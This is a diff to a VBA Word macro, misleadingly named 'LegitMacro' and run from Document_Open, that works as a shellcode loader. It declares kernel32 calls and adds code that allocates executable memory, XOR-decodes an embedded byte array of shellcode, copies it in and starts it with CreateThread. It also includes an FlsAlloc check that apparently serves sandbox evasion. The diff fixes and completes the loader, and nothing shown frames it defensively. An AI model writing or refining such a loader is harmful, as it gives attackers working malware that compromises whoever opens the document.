@@ -2,7 +2,7 @@ Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Lo
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
-Private Declare PtrSafe Function FlsAlloc Lib "kernel32" () As LongPtr
+Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
 Sub LegitMacro()
     Dim allocRes As LongPtr
     Dim t1 As Date
@@ -15,7 +15,7 @@ Sub LegitMacro()
     Dim res As LongPtr
     
     ' Call FlsAlloc and verify if the result exists
-    allocRes = FlsAlloc()
+    allocRes = FlsAlloc(0)
     If IsNull(allocRes) Then
         End
     End If
@@ -42,16 +42,21 @@ Sub LegitMacro()
     250, 187, 162, 144, 250, 160, 187, 64, 241, 213, 245, 202, 5, 47, 173, 163, 187, 64, 143, 148, 183, 155, 5, 47, 179, 5, 52, 19, 198, 5, 5, 5, 178, 251, 57, 178, 211, 60, 178, 127, 12, 143, 78, 187, 5, 29, 162, 144, 250, 163, _
     65, 26, 231, 208, 240, 187, 115, 32, 5, 47)
     
+    ' Allocate memory space
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+
     ' Decode the shellcode
     For i = 0 To UBound(buf)
         buf(i) = buf(i) Xor 250
     Next i
     
-    ' Execute the shellcode
+    ' Move the shellcode
     For counter = LBound(buf) To UBound(buf)
         data = buf(counter)
         res = RtlMoveMemory(addr + counter, data, 1)
     Next counter
+
+    ' Execute the shellcode
     res = CreateThread(0, 0, addr, 0, 0, 0)
 End Sub
 Sub Document_Open()
